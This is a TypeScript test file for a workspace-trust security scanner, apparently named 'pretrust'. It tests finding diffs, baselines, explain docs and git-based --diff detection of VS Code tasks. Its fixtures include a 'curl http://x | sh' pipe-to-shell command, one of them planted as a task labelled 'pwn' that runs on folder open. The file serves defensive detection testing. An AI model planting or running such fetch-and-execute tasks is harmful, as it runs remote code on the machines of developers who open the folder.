import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { execFileSync } from 'node:child_process';
import { diffFindings } from '../dist/scan/scan.js';
import { writeBaseline, loadBaseline, applyBaseline } from '../dist/baseline.js';
import { SURFACE_DOCS, renderExplain } from '../dist/explain.js';
import { SURFACES } from '../dist/scan/scan.js';
import { createStyle } from '../dist/report/style.js';

const plainStyle = createStyle({ isTty: false, env: { NO_COLOR: '1' } });

// --- diffFindings (pure) -----------------------------------------------------

const f = (over: Partial<any> = {}): any => ({
  surface: 'vscode-tasks',
  title: 't',
  trigger: 'folder-open',
  boundary: 'host',
  gate: 'workspace-trust',
  severity: 'high',
  file: '.vscode/tasks.json',
  line: 1,
  evidence: 'curl x | sh',
  signals: [],
  note: 'n',
  ...over,
});

test('diffFindings returns only paths absent from the base', () => {
  const base = [f({ evidence: 'a' })];
  const head = [f({ evidence: 'a' }), f({ evidence: 'b' })];
  const added = diffFindings(base, head);
  assert.equal(added.length, 1);
  assert.equal(added[0].evidence, 'b');
});

test('diffFindings ignores line changes (same path moved)', () => {
  const base = [f({ line: 3 })];
  const head = [f({ line: 99 })];
  assert.deepEqual(diffFindings(base, head), []);
});

// --- baseline ----------------------------------------------------------------

test('baseline round-trip suppresses recorded paths', () => {
  const dir = mkdtempSync(join(tmpdir(), 'pretrust-bl-'));
  try {
    const path = join(dir, 'bl.json');
    const findings = [f({ evidence: 'a' }), f({ evidence: 'b' })];
    const count = writeBaseline(path, findings);
    assert.equal(count, 2);

    const loaded = loadBaseline(path)!;
    const { fresh, suppressed } = applyBaseline(findings, loaded);
    assert.equal(suppressed.length, 2);
    assert.equal(fresh.length, 0);

    // A newly-added path is fresh.
    const { fresh: fresh2 } = applyBaseline([...findings, f({ evidence: 'c' })], loaded);
    assert.equal(fresh2.length, 1);
    assert.equal(fresh2[0].evidence, 'c');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('loadBaseline returns null for a missing file', () => {
  assert.equal(loadBaseline(join(tmpdir(), 'does-not-exist-pretrust.json')), null);
});

// --- explain -----------------------------------------------------------------

test('every registered surface has an explain entry', () => {
  for (const s of SURFACES) {
    assert.ok(SURFACE_DOCS.some((d) => d.id === s.id), `missing explain doc for ${s.id}`);
  }
});

test('renderExplain names an unknown surface', () => {
  const out = renderExplain('nonsense', plainStyle);
  assert.match(out, /Unknown surface/);
});

// --- diff integration with a real git repo -----------------------------------

test('a folder-open task added since a base ref is reported by --diff', (t) => {
  let git = true;
  const dir = mkdtempSync(join(tmpdir(), 'pretrust-git-'));
  try {
    const run = (...args: string[]) =>
      execFileSync('git', ['-C', dir, ...args], { stdio: 'ignore' });
    try {
      run('init');
      run('config', 'user.email', 'test@example.com');
      run('config', 'user.name', 'test');
      run('config', 'commit.gpgsign', 'false');
    } catch {
      git = false;
      t.skip('git not available');
      return;
    }

    // Base commit: a benign tasks.json with no folder-open task.
    mkdirSync(join(dir, '.vscode'), { recursive: true });
    writeFileSync(
      join(dir, '.vscode', 'tasks.json'),
      JSON.stringify({ version: '2.0.0', tasks: [{ label: 'build', command: 'npm run build' }] }),
    );
    run('add', '-A');
    run('commit', '-m', 'base');

    // Working tree: add a folder-open task.
    writeFileSync(
      join(dir, '.vscode', 'tasks.json'),
      JSON.stringify({
        version: '2.0.0',
        tasks: [
          { label: 'build', command: 'npm run build' },
          { label: 'pwn', command: 'curl http://x | sh', runOptions: { runOn: 'folderOpen' } },
        ],
      }),
    );

    // Run the built CLI in --diff mode against the base commit.
    const out = execFileSync(
      process.execPath,
      [join(process.cwd(), 'dist', 'cli.js'), dir, '--diff', 'HEAD', '--json', '--fail-on', 'none'],
      { encoding: 'utf8', env: { ...process.env, NO_COLOR: '1' } },
    );
    const report = JSON.parse(out);
    assert.equal(report.summary.total, 1, 'only the added folder-open task should appear');
    assert.equal(report.findings[0].surface, 'vscode-tasks');
  } finally {
    if (git) rmSync(dir, { recursive: true, force: true });
  }
});
